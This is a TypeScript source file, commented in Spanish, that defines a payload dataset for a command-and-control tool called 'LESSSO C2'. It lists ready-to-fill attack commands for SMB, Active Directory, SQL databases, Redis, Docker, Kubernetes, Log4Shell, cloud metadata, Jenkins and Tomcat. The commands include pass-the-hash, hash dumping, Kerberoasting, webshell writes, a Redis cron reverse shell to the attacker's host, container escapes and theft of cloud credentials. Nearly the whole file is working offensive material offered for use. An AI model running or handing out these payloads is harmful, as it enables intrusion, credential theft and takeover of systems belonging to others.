// ==========================================================
// LESSSO C2 — Dataset de Payloads por Servicio
// ----------------------------------------------------------
// Payloads específicos para atacar servicios comunes.
// Cada payload trae el comando concreto con placeholders:
//
//   {TARGET}   → IP / hostname del objetivo
//   {USER}     → usuario a usar
//   {PASS}     → contraseña
//   {HASH}     → hash NTLM
//   {DOMAIN}   → dominio AD
//   {LHOST}    → IP del atacante
//   {LPORT}    → puerto del atacante
//   {COLLAB}   → dominio de collaborator
//   {PORT}     → puerto del servicio
// ==========================================================

export type ServiceCategory =
  | 'smb'
  | 'ldap'
  | 'sql'
  | 'redis'
  | 'elastic'
  | 'docker'
  | 'kubernetes'
  | 'ssh'
  | 'ftp'
  | 'winrm'
  | 'jndi'
  | 'graphql'
  | 'cloud'
  | 'mongodb'
  | 'rmi'
  | 'jenkins'
  | 'tomcat';

export interface ServicePayload {
  id: string;
  name: string;
  category: ServiceCategory;
  tool: string;
  command: string;
  description?: string;
  tags?: string[];
}

// ==========================================================
// SMB (Samba, Windows, Active Directory)
// ==========================================================
const SMB: ServicePayload[] = [
  {
    id: 'smb-null-session',
    name: 'Null Session (SMB)',
    category: 'smb',
    tool: 'smbclient',
    command: `smbclient -N -L //{TARGET}`,
    description: 'Lista los shares sin credenciales.',
    tags: ['enumeration', 'null-session'],
  },
  {
    id: 'smb-enum-shares',
    name: 'Enumerar Shares',
    category: 'smb',
    tool: 'smbclient',
    command: `smbclient -U {USER}%{PASS} -L //{TARGET}`,
    tags: ['enumeration'],
  },
  {
    id: 'smb-enum-users',
    name: 'Enumerar Usuarios',
    category: 'smb',
    tool: 'enum4linux-ng',
    command: `enum4linux-ng -A {TARGET}`,
    tags: ['enumeration', 'users'],
  },
  {
    id: 'smb-cme-users',
    name: 'CME — Listar Usuarios',
    category: 'smb',
    tool: 'crackmapexec',
    command: `crackmapexec smb {TARGET} -u {USER} -p {PASS} --users`,
    tags: ['enumeration', 'cme'],
  },
  {
    id: 'smb-cme-shares',
    name: 'CME — Listar Shares',
    category: 'smb',
    tool: 'crackmapexec',
    command: `crackmapexec smb {TARGET} -u {USER} -p {PASS} --shares`,
    tags: ['enumeration', 'cme'],
  },
  {
    id: 'smb-cme-passpol',
    name: 'CME — Password Policy',
    category: 'smb',
    tool: 'crackmapexec',
    command: `crackmapexec smb {TARGET} -u {USER} -p {PASS} --pass-pol`,
    tags: ['enumeration', 'cme'],
  },
  {
    id: 'smb-cme-pth',
    name: 'CME — Pass-the-Hash',
    category: 'smb',
    tool: 'crackmapexec',
    command: `crackmapexec smb {TARGET} -u {USER} -H {HASH}`,
    description: 'Autentica con hash NTLM sin conocer la password.',
    tags: ['pth', 'cme'],
  },
  {
    id: 'smb-psexec',
    name: 'PSExec',
    category: 'smb',
    tool: 'impacket-psexec',
    command: `impacket-psexec {DOMAIN}/{USER}:{PASS}@{TARGET}`,
    description: 'Ejecuta comandos como SYSTEM via SMB.',
    tags: ['execution', 'impacket'],
  },
  {
    id: 'smb-psexec-pth',
    name: 'PSExec (Pass-the-Hash)',
    category: 'smb',
    tool: 'impacket-psexec',
    command: `impacket-psexec -hashes :{HASH} {DOMAIN}/{USER}@{TARGET}`,
    tags: ['pth', 'execution'],
  },
  {
    id: 'smb-wmiexec',
    name: 'WMIExec',
    category: 'smb',
    tool: 'impacket-wmiexec',
    command: `impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{TARGET}`,
    description: 'Ejecuta via WMI. Menos ruidoso que PSExec.',
    tags: ['execution', 'impacket', 'stealth'],
  },
  {
    id: 'smb-smbexec',
    name: 'SMBExec',
    category: 'smb',
    tool: 'impacket-smbexec',
    command: `impacket-smbexec {DOMAIN}/{USER}:{PASS}@{TARGET}`,
    description: 'Ejecuta via SMB sin dejar binario en disco.',
    tags: ['execution', 'impacket', 'stealth'],
  },
  {
    id: 'smb-secretsdump',
    name: 'SecretsDump (SAM/LSA/NTDS)',
    category: 'smb',
    tool: 'impacket-secretsdump',
    command: `impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{TARGET}`,
    description: 'Volcado de hashes SAM, LSA y NTDS.dit.',
    tags: ['credentials', 'impacket'],
  },
  {
    id: 'smb-ntlmrelayx',
    name: 'NTLMRelayX',
    category: 'smb',
    tool: 'impacket-ntlmrelayx',
    command: `impacket-ntlmrelayx -tf targets.txt -smb2support -socks`,
    description: 'Relay de autenticación NTLM. Requiere SMB signing deshabilitado.',
    tags: ['relay', 'ad'],
  },
  {
    id: 'smb-responder',
    name: 'Responder',
    category: 'smb',
    tool: 'responder',
    command: `sudo responder -I {INTERFACE} -wv`,
    description: 'Envenenamiento LLMNR/NBT-NS/MDNS.',
    tags: ['poisoning', 'ad'],
  },
];

// ==========================================================
// LDAP / ACTIVE DIRECTORY
// ==========================================================
const LDAP: ServicePayload[] = [
  {
    id: 'ldapsearch-anon',
    name: 'LDAPSearch anónimo',
    category: 'ldap',
    tool: 'ldapsearch',
    command: `ldapsearch -x -H ldap://{TARGET} -b "dc=example,dc=com"`,
    description: 'Bind anónimo si está permitido.',
    tags: ['enumeration'],
  },
  {
    id: 'ldapsearch-auth',
    name: 'LDAPSearch con credenciales',
    category: 'ldap',
    tool: 'ldapsearch',
    command: `ldapsearch -x -H ldap://{TARGET} -D "{USER}@{DOMAIN}" -w '{PASS}' -b "dc={DOMAIN},dc=local"`,
    tags: ['enumeration'],
  },
  {
    id: 'bloodhound-python',
    name: 'BloodHound.py',
    category: 'ldap',
    tool: 'bloodhound-python',
    command: `bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {TARGET} -c All`,
    description: 'Recolecta datos de AD para análisis de rutas de ataque.',
    tags: ['enumeration', 'ad', 'bloodhound'],
  },
  {
    id: 'bloodhound-sharphound',
    name: 'SharpHound',
    category: 'ldap',
    tool: 'sharphound.exe',
    command: `SharpHound.exe -c All --zipfilename bh.zip`,
    description: 'Recolector de BloodHound para Windows.',
    tags: ['enumeration', 'ad', 'windows'],
  },
  {
    id: 'ad-getuserspns',
    name: 'GetUserSPNs (Kerberoasting)',
    category: 'ldap',
    tool: 'impacket-GetUserSPNs',
    command: `impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {TARGET} -request`,
    description: 'Extrae hashes de cuentas de servicio con SPN.',
    tags: ['kerberoast', 'ad', 'credentials'],
  },
  {
    id: 'ad-getnpusers',
    name: 'GetNPUsers (AS-REP Roasting)',
    category: 'ldap',
    tool: 'impacket-GetNPUsers',
    command: `impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {TARGET} -request`,
    description: 'Obtiene hashes AS-REP de cuentas sin pre-auth Kerberos.',
    tags: ['asreproast', 'ad', 'credentials'],
  },
  {
    id: 'ad-getadusers',
    name: 'GetADUsers',
    category: 'ldap',
    tool: 'impacket-GetADUsers',
    command: `impacket-GetADUsers -all {DOMAIN}/{USER}:{PASS} -dc-ip {TARGET}`,
    tags: ['enumeration', 'ad'],
  },
  {
    id: 'ad-kerbrute',
    name: 'Kerbrute (User Enum)',
    category: 'ldap',
    tool: 'kerbrute',
    command: `kerbrute userenum --dc {TARGET} -d {DOMAIN} users.txt`,
    description: 'Enumera usuarios válidos via Kerberos pre-auth.',
    tags: ['enumeration', 'ad', 'stealth'],
  },
  {
    id: 'ad-kerbrute-pass',
    name: 'Kerbrute (Password Spray)',
    category: 'ldap',
    tool: 'kerbrute',
    command: `kerbrute passwordspray --dc {TARGET} -d {DOMAIN} users.txt 'Password123'`,
    tags: ['password-spray', 'ad'],
  },
  {
    id: 'ad-certipy',
    name: 'Certipy (AD CS)',
    category: 'ldap',
    tool: 'certipy',
    command: `certipy find -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {TARGET} -vulnerable -stdout`,
    description: 'Enumera vulnerabilidades en AD Certificate Services.',
    tags: ['adcs', 'ad', 'enumeration'],
  },
];

// ==========================================================
// SQL DATABASES
// ==========================================================
const SQL: ServicePayload[] = [
  {
    id: 'mysql-connect',
    name: 'MySQL — Conectar',
    category: 'sql',
    tool: 'mysql',
    command: `mysql -h {TARGET} -u {USER} -p'{PASS}'`,
    tags: ['mysql'],
  },
  {
    id: 'mysql-connect-root',
    name: 'MySQL — Conectar como root',
    category: 'sql',
    tool: 'mysql',
    command: `mysql -h {TARGET} -u root -p'{PASS}'`,
    tags: ['mysql'],
  },
  {
    id: 'mysql-read-file',
    name: 'MySQL — Leer archivo',
    category: 'sql',
    tool: 'mysql',
    command: `SELECT LOAD_FILE('/etc/passwd');`,
    description: 'Requiere FILE privilege.',
    tags: ['mysql', 'file-read'],
  },
  {
    id: 'mysql-write-webshell',
    name: 'MySQL — Escribir webshell',
    category: 'sql',
    tool: 'mysql',
    command: `SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';`,
    description: 'Requiere FILE privilege y secure_file_priv = "".',
    tags: ['mysql', 'rce', 'webshell'],
  },
  {
    id: 'mysql-udf',
    name: 'MySQL — UDF RCE',
    category: 'sql',
    tool: 'mysql',
    command: `# Requiere cargar una librería .so con funciones del sistema\nSELECT sys_exec('id');`,
    description: 'Necesitas explotar primero para subir el .so (raptor_udf2).',
    tags: ['mysql', 'rce'],
  },
  {
    id: 'postgres-connect',
    name: 'PostgreSQL — Conectar',
    category: 'sql',
    tool: 'psql',
    command: `psql -h {TARGET} -U {USER} -d postgres`,
    tags: ['postgres'],
  },
  {
    id: 'postgres-rce',
    name: 'PostgreSQL — Command Execution',
    category: 'sql',
    tool: 'psql',
    command: `CREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;`,
    description: 'Requiere superuser.',
    tags: ['postgres', 'rce'],
  },
  {
    id: 'postgres-read-file',
    name: 'PostgreSQL — Leer archivo',
    category: 'sql',
    tool: 'psql',
    command: `CREATE TABLE temp_t(t text);\nCOPY temp_t FROM '/etc/passwd';\nSELECT * FROM temp_t;`,
    description: 'Requiere superuser y pg_read_server_files role.',
    tags: ['postgres', 'file-read'],
  },
  {
    id: 'mssql-connect',
    name: 'MSSQL — Conectar',
    category: 'sql',
    tool: 'impacket-mssqlclient',
    command: `impacket-mssqlclient {DOMAIN}/{USER}:{PASS}@{TARGET} -windows-auth`,
    tags: ['mssql'],
  },
  {
    id: 'mssql-xpcmdshell',
    name: 'MSSQL — xp_cmdshell',
    category: 'sql',
    tool: 'impacket-mssqlclient',
    command: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';`,
    description: 'Requiere sysadmin.',
    tags: ['mssql', 'rce'],
  },
  {
    id: 'mssql-enable-xpcmdshell',
    name: 'MSSQL — Habilitar xp_cmdshell',
    category: 'sql',
    tool: 'impacket-mssqlclient',
    command: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`,
    tags: ['mssql', 'config'],
  },
  {
    id: 'mssql-impersonate',
    name: 'MSSQL — Impersonate sa',
    category: 'sql',
    tool: 'impacket-mssqlclient',
    command: `EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;`,
    description: 'Requiere IMPERSONATE privilege.',
    tags: ['mssql', 'privesc'],
  },
];

// ==========================================================
// REDIS
// ==========================================================
const REDIS: ServicePayload[] = [
  {
    id: 'redis-connect',
    name: 'Redis — Conectar',
    category: 'redis',
    tool: 'redis-cli',
    command: `redis-cli -h {TARGET} -p {PORT}`,
    tags: ['redis'],
  },
  {
    id: 'redis-webshell',
    name: 'Redis — Escribir webshell',
    category: 'redis',
    tool: 'redis-cli',
    command: `redis-cli -h {TARGET}\nconfig set dir /var/www/html\nconfig set dbfilename shell.php\nset x "<?php system($_GET['c']); ?>"\nsave`,
    description: 'Requiere permisos de escritura en el directorio web.',
    tags: ['redis', 'webshell'],
  },
  {
    id: 'redis-ssh-key',
    name: 'Redis — Escribir SSH key',
    category: 'redis',
    tool: 'redis-cli',
    command: `redis-cli -h {TARGET}\nconfig set dir /root/.ssh/\nconfig set dbfilename authorized_keys\nset x "\\n\\n<tu_clave_pub>\\n\\n"\nsave`,
    description: 'Requiere correr Redis como root.',
    tags: ['redis', 'ssh', 'rce'],
  },
  {
    id: 'redis-cron',
    name: 'Redis — Cron RCE',
    category: 'redis',
    tool: 'redis-cli',
    command: `redis-cli -h {TARGET}\nconfig set dir /var/spool/cron/crontabs\nconfig set dbfilename root\nset x "\\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'\\n"\nsave`,
    tags: ['redis', 'rce', 'cron'],
  },
];

// ==========================================================
// ELASTICSEARCH
// ==========================================================
const ELASTIC: ServicePayload[] = [
  {
    id: 'elastic-enum',
    name: 'Elasticsearch — Info',
    category: 'elastic',
    tool: 'curl',
    command: `curl http://{TARGET}:9200/`,
    tags: ['elastic', 'enumeration'],
  },
  {
    id: 'elastic-indices',
    name: 'Elasticsearch — Listar índices',
    category: 'elastic',
    tool: 'curl',
    command: `curl http://{TARGET}:9200/_cat/indices?v`,
    tags: ['elastic', 'enumeration'],
  },
  {
    id: 'elastic-dump-index',
    name: 'Elasticsearch — Dump índice',
    category: 'elastic',
    tool: 'curl',
    command: `curl http://{TARGET}:9200/{INDEX}/_search?pretty=true&size=1000`,
    tags: ['elastic', 'dump'],
  },
  {
    id: 'elastic-script-rce',
    name: 'Elasticsearch — Script RCE',
    category: 'elastic',
    tool: 'curl',
    command: `curl -XPOST http://{TARGET}:9200/_scripts/1 -H 'Content-Type: application/json' -d '{"script":{"lang":"painless","source":"Runtime.getRuntime().exec(\\"id\\");"}}'`,
    description: 'Requiere scripting habilitado (por defecto en versiones antiguas).',
    tags: ['elastic', 'rce'],
  },
];

// ==========================================================
// DOCKER
// ==========================================================
const DOCKER: ServicePayload[] = [
  {
    id: 'docker-version',
    name: 'Docker API — Version',
    category: 'docker',
    tool: 'curl',
    command: `curl http://{TARGET}:2375/version`,
    description: 'Verifica si Docker API está expuesta sin TLS.',
    tags: ['docker', 'enumeration'],
  },
  {
    id: 'docker-list-containers',
    name: 'Docker API — Listar contenedores',
    category: 'docker',
    tool: 'curl',
    command: `curl http://{TARGET}:2375/containers/json`,
    tags: ['docker', 'enumeration'],
  },
  {
    id: 'docker-escape',
    name: 'Docker API — Escape (mount host)',
    category: 'docker',
    tool: 'curl',
    command: `curl -X POST http://{TARGET}:2375/containers/create -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'`,
    description: 'Crea un contenedor con / del host montado. Luego accede con exec.',
    tags: ['docker', 'escape', 'rce'],
  },
  {
    id: 'docker-socket',
    name: 'Docker Socket (local)',
    category: 'docker',
    tool: 'docker',
    command: `docker -H unix:///var/run/docker.sock ps`,
    description: 'Si tienes acceso al socket Docker, tienes root.',
    tags: ['docker', 'privesc', 'local'],
  },
];

// ==========================================================
// KUBERNETES
// ==========================================================
const KUBERNETES: ServicePayload[] = [
  {
    id: 'k8s-api-version',
    name: 'K8s API — Version',
    category: 'kubernetes',
    tool: 'curl',
    command: `curl -k https://{TARGET}:6443/version`,
    tags: ['k8s', 'enumeration'],
  },
  {
    id: 'k8s-anon-pods',
    name: 'K8s — Pods (anónimo)',
    category: 'kubernetes',
    tool: 'curl',
    command: `curl -k https://{TARGET}:6443/api/v1/pods`,
    description: 'Funciona si el API server permite acceso anónimo.',
    tags: ['k8s', 'enumeration'],
  },
  {
    id: 'k8s-token',
    name: 'K8s — Token del pod',
    category: 'kubernetes',
    tool: 'cat',
    command: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`,
    description: 'Dentro de un pod, el token del ServiceAccount.',
    tags: ['k8s', 'credentials', 'local'],
  },
  {
    id: 'k8s-privileged-pod',
    name: 'K8s — Crear pod privilegiado',
    category: 'kubernetes',
    tool: 'kubectl',
    command: `kubectl run pwn --image=alpine --restart=Never --overrides='{"spec":{"containers":[{"name":"pwn","image":"alpine","command":["/bin/sh"],"stdin":true,"tty":true,"securityContext":{"privileged":true},"volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}' -it --rm`,
    description: 'Si puedes crear pods, puedes montar el filesystem del nodo.',
    tags: ['k8s', 'escape', 'rce'],
  },
];

// ==========================================================
// SSH
// ==========================================================
const SSH: ServicePayload[] = [
  {
    id: 'ssh-connect',
    name: 'SSH — Conectar',
    category: 'ssh',
    tool: 'ssh',
    command: `ssh {USER}@{TARGET}`,
    tags: ['ssh'],
  },
  {
    id: 'ssh-key',
    name: 'SSH — Con clave privada',
    category: 'ssh',
    tool: 'ssh',
    command: `ssh -i id_rsa {USER}@{TARGET}`,
    tags: ['ssh', 'key'],
  },
  {
    id: 'ssh-keygen-crack',
    name: 'SSH — Crackear clave',
    category: 'ssh',
    tool: 'ssh2john',
    command: `ssh2john id_rsa > id_rsa.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`,
    description: 'Si la clave tiene passphrase, se puede crackear.',
    tags: ['ssh', 'crack'],
  },
  {
    id: 'ssh-tunnel-local',
    name: 'SSH — Túnel local',
    category: 'ssh',
    tool: 'ssh',
    command: `ssh -L 8080:internal:80 {USER}@{TARGET}`,
    description: 'Forward del puerto 80 interno a 8080 local.',
    tags: ['ssh', 'tunnel'],
  },
  {
    id: 'ssh-tunnel-dynamic',
    name: 'SSH — SOCKS Proxy',
    category: 'ssh',
    tool: 'ssh',
    command: `ssh -D 1080 {USER}@{TARGET}`,
    description: 'Crea un proxy SOCKS5 dinámico.',
    tags: ['ssh', 'tunnel', 'pivot'],
  },
  {
    id: 'ssh-tunnel-remote',
    name: 'SSH — Remote Forward',
    category: 'ssh',
    tool: 'ssh',
    command: `ssh -R 8080:localhost:80 {USER}@{TARGET}`,
    description: 'Expone un servicio local en el remoto.',
    tags: ['ssh', 'tunnel', 'reverse'],
  },
];

// ==========================================================
// FTP
// ==========================================================
const FTP: ServicePayload[] = [
  {
    id: 'ftp-connect',
    name: 'FTP — Conectar',
    category: 'ftp',
    tool: 'ftp',
    command: `ftp {TARGET} {PORT}`,
    tags: ['ftp'],
  },
  {
    id: 'ftp-anon',
    name: 'FTP — Anonymous Login',
    category: 'ftp',
    tool: 'ftp',
    command: `ftp anonymous@{TARGET}`,
    description: 'Intenta login con usuario "anonymous" y password vacío.',
    tags: ['ftp', 'anonymous'],
  },
  {
    id: 'ftp-download-all',
    name: 'FTP — Descargar todo',
    category: 'ftp',
    tool: 'wget',
    command: `wget -m --no-passive ftp://{USER}:{PASS}@{TARGET}`,
    tags: ['ftp', 'download'],
  },
];

// ==========================================================
// WINRM
// ==========================================================
const WINRM: ServicePayload[] = [
  {
    id: 'winrm-connect',
    name: 'WinRM — Conectar (evil-winrm)',
    category: 'winrm',
    tool: 'evil-winrm',
    command: `evil-winrm -i {TARGET} -u {USER} -p '{PASS}'`,
    tags: ['winrm'],
  },
  {
    id: 'winrm-pth',
    name: 'WinRM — Pass-the-Hash',
    category: 'winrm',
    tool: 'evil-winrm',
    command: `evil-winrm -i {TARGET} -u {USER} -H {HASH}`,
    tags: ['winrm', 'pth'],
  },
  {
    id: 'winrm-cme',
    name: 'WinRM — CME Command',
    category: 'winrm',
    tool: 'crackmapexec',
    command: `crackmapexec winrm {TARGET} -u {USER} -p {PASS} -x whoami`,
    tags: ['winrm', 'cme'],
  },
];

// ==========================================================
// JNDI / LOG4SHELL
// ==========================================================
const JNDI: ServicePayload[] = [
  {
    id: 'jndi-basic',
    name: 'JNDI — Basic',
    category: 'jndi',
    tool: 'jndi',
    command: `\${jndi:ldap://{COLLAB}/a}`,
    description: 'Payload de Log4Shell. Combina con JNDI-Exploit-Kit o marshalsec.',
    tags: ['log4shell', 'jndi', 'cve-2021-44228'],
  },
  {
    id: 'jndi-bypass-lower',
    name: 'JNDI — Bypass lowercase',
    category: 'jndi',
    tool: 'jndi',
    command: `\${jndi:ldap://{COLLAB}/a}`,
    description: 'Bypass de filtros con ${${lower:j}ndi:...}.',
    tags: ['log4shell', 'bypass'],
  },
  {
    id: 'jndi-bypass-env',
    name: 'JNDI — Bypass env vars',
    category: 'jndi',
    tool: 'jndi',
    command: `\${jndi:ldap://\${env:ENV_VAR}.{COLLAB}/a}`,
    description: 'Usa variables de entorno para evadir regex.',
    tags: ['log4shell', 'bypass'],
  },
  {
    id: 'jndi-bypass-full',
    name: 'JNDI — Bypass completo',
    category: 'jndi',
    tool: 'jndi',
    command: `\${jndi:ldap://{COLLAB}/\${env:USER}}`,
    tags: ['log4shell', 'bypass'],
  },
];

// ==========================================================
// GRAPHQL
// ==========================================================
const GRAPHQL: ServicePayload[] = [
  {
    id: 'graphql-introspection',
    name: 'GraphQL — Introspection',
    category: 'graphql',
    tool: 'curl',
    command: `curl -X POST http://{TARGET}/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}'`,
    description: 'Enumera el schema completo si introspection está habilitada.',
    tags: ['graphql', 'enumeration'],
  },
  {
    id: 'graphql-query',
    name: 'GraphQL — Query simple',
    category: 'graphql',
    tool: 'curl',
    command: `curl -X POST http://{TARGET}/graphql -H 'Content-Type: application/json' -d '{"query":"{users{id,username,email}}"}'`,
    tags: ['graphql'],
  },
  {
    id: 'graphql-bypass-auth',
    name: 'GraphQL — Query con alias',
    category: 'graphql',
    tool: 'curl',
    command: `curl -X POST http://{TARGET}/graphql -H 'Content-Type: application/json' -d '{"query":"{a:__schema{types{name}} b:__schema{types{name}}}"}'`,
    description: 'Bypass de rate limit usando aliases.',
    tags: ['graphql', 'bypass'],
  },
];

// ==========================================================
// CLOUD (AWS/GCP/Azure)
// ==========================================================
const CLOUD: ServicePayload[] = [
  {
    id: 'aws-metadata-imdsv1',
    name: 'AWS — IMDSv1',
    category: 'cloud',
    tool: 'curl',
    command: `curl http://169.254.169.254/latest/meta-data/`,
    description: 'Metadata de la instancia EC2. IMDSv1 no requiere token.',
    tags: ['aws', 'ssrf'],
  },
  {
    id: 'aws-metadata-imdsv2',
    name: 'AWS — IMDSv2',
    category: 'cloud',
    tool: 'curl',
    command: `TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\ncurl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/`,
    description: 'IMDSv2 requiere token PUT primero.',
    tags: ['aws', 'ssrf', 'imdsv2'],
  },
  {
    id: 'aws-iam-creds',
    name: 'AWS — IAM Credentials',
    category: 'cloud',
    tool: 'curl',
    command: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}`,
    description: 'Obtiene credenciales temporales del rol asignado a la instancia.',
    tags: ['aws', 'credentials'],
  },
  {
    id: 'gcp-metadata',
    name: 'GCP — Metadata',
    category: 'cloud',
    tool: 'curl',
    command: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`,
    tags: ['gcp', 'ssrf'],
  },
  {
    id: 'azure-metadata',
    name: 'Azure — Metadata',
    category: 'cloud',
    tool: 'curl',
    command: `curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"`,
    tags: ['azure', 'ssrf'],
  },
];

// ==========================================================
// MONGODB
// ==========================================================
const MONGODB: ServicePayload[] = [
  {
    id: 'mongo-connect',
    name: 'MongoDB — Conectar',
    category: 'mongodb',
    tool: 'mongosh',
    command: `mongosh "mongodb://{TARGET}:27017"`,
    tags: ['mongodb'],
  },
  {
    id: 'mongo-list-dbs',
    name: 'MongoDB — Listar DBs',
    category: 'mongodb',
    tool: 'mongosh',
    command: `show dbs`,
    tags: ['mongodb', 'enumeration'],
  },
  {
    id: 'mongo-dump-all',
    name: 'MongoDB — Dump todo',
    category: 'mongodb',
    tool: 'mongodump',
    command: `mongodump --host {TARGET} --port 27017 --out ./dump`,
    tags: ['mongodb', 'dump'],
  },
];

// ==========================================================
// RMI (Java)
// ==========================================================
const RMI: ServicePayload[] = [
  {
    id: 'rmi-enum',
    name: 'RMI — Enum',
    category: 'rmi',
    tool: 'nmap',
    command: `nmap -sV -p {PORT} --script rmi-dumpregistry {TARGET}`,
    tags: ['rmi', 'enumeration'],
  },
  {
    id: 'rmi-rmg',
    name: 'RMI — Remote Method Guesser',
    category: 'rmi',
    tool: 'BaRMIe',
    command: `java -jar BaRMIe.jar -enum {TARGET} {PORT}`,
    description: 'Enumera servicios RMI y busca métodos invocables.',
    tags: ['rmi', 'enumeration'],
  },
];

// ==========================================================
// JENKINS
// ==========================================================
const JENKINS: ServicePayload[] = [
  {
    id: 'jenkins-script-console',
    name: 'Jenkins — Script Console',
    category: 'jenkins',
    tool: 'curl',
    command: `curl -X POST http://{TARGET}/scriptText --data-urlencode 'script=println "id".execute().text'`,
    description: 'Requiere acceso autenticado. RCE via Groovy.',
    tags: ['jenkins', 'rce'],
  },
  {
    id: 'jenkins-unauth',
    name: 'Jenkins — Check unauth',
    category: 'jenkins',
    tool: 'curl',
    command: `curl http://{TARGET}/api/json?tree=jobs[name]`,
    tags: ['jenkins', 'enumeration'],
  },
  {
    id: 'jenkins-cli',
    name: 'Jenkins — CLI RCE',
    category: 'jenkins',
    tool: 'java',
    command: `java -jar jenkins-cli.jar -s http://{TARGET} groovy = < /tmp/exploit.groovy`,
    tags: ['jenkins', 'rce'],
  },
];

// ==========================================================
// TOMCAT
// ==========================================================
const TOMCAT: ServicePayload[] = [
  {
    id: 'tomcat-manager-deploy',
    name: 'Tomcat — Deploy WAR',
    category: 'tomcat',
    tool: 'curl',
    command: `curl -u {USER}:{PASS} -T shell.war "http://{TARGET}/manager/text/deploy?path=/shell&update=true"`,
    description: 'Requiere acceso al manager con rol manager-script.',
    tags: ['tomcat', 'rce'],
  },
  {
    id: 'tomcat-check-manager',
    name: 'Tomcat — Check Manager',
    category: 'tomcat',
    tool: 'curl',
    command: `curl -u {USER}:{PASS} http://{TARGET}/manager/html`,
    tags: ['tomcat', 'enumeration'],
  },
];

// ==========================================================
// EXPORT
// ==========================================================
export const SERVICE_PAYLOADS: ServicePayload[] = [
  ...SMB,
  ...LDAP,
  ...SQL,
  ...REDIS,
  ...ELASTIC,
  ...DOCKER,
  ...KUBERNETES,
  ...SSH,
  ...FTP,
  ...WINRM,
  ...JNDI,
  ...GRAPHQL,
  ...CLOUD,
  ...MONGODB,
  ...RMI,
  ...JENKINS,
  ...TOMCAT,
];

// Metadata para UI
export const SERVICE_CATEGORIES: Record<ServiceCategory, { label: string; icon: string; color: string }> = {
  smb:         { label: 'SMB / Windows',       icon: '🖥', color: 'blue' },
  ldap:        { label: 'LDAP / AD',           icon: '🗂', color: 'indigo' },
  sql:         { label: 'SQL Databases',       icon: '🗄', color: 'amber' },
  redis:       { label: 'Redis',               icon: '⚡', color: 'red' },
  elastic:     { label: 'Elasticsearch',       icon: '🔍', color: 'yellow' },
  docker:      { label: 'Docker',              icon: '🐳', color: 'cyan' },
  kubernetes:  { label: 'Kubernetes',          icon: '☸', color: 'purple' },
  ssh:         { label: 'SSH',                 icon: '🔐', color: 'emerald' },
  ftp:         { label: 'FTP',                 icon: '📁', color: 'orange' },
  winrm:       { label: 'WinRM',               icon: '🪟', color: 'sky' },
  jndi:        { label: 'JNDI / Log4Shell',    icon: '💉', color: 'rose' },
  graphql:     { label: 'GraphQL',             icon: '🔗', color: 'pink' },
  cloud:       { label: 'Cloud (AWS/GCP/Azure)', icon: '☁️', color: 'slate' },
  mongodb:     { label: 'MongoDB',             icon: '🍃', color: 'green' },
  rmi:         { label: 'RMI (Java)',          icon: '☕', color: 'orange' },
  jenkins:     { label: 'Jenkins',             icon: '👷', color: 'violet' },
  tomcat:      { label: 'Apache Tomcat',       icon: '🐱', color: 'yellow' },
};

// Utilidades
export function filterByService(category: ServiceCategory | 'all'): ServicePayload[] {
  if (category === 'all') return SERVICE_PAYLOADS;
  return SERVICE_PAYLOADS.filter(p => p.category === category);
}

export function searchServicePayloads(query: string): ServicePayload[] {
  const q = query.toLowerCase();
  return SERVICE_PAYLOADS.filter(p =>
    p.name.toLowerCase().includes(q) ||
    p.command.toLowerCase().includes(q) ||
    (p.tags || []).some(t => t.toLowerCase().includes(q)) ||
    (p.description && p.description.toLowerCase().includes(q))
  );
}

export function renderServicePayload(p: ServicePayload, vars: Record<string, string>): string {
  let out = p.command;
  for (const [key, value] of Object.entries(vars)) {
    out = out.replace(new RegExp(`\\{${key}\\}`, 'g'), value);
  }
  return out;
}
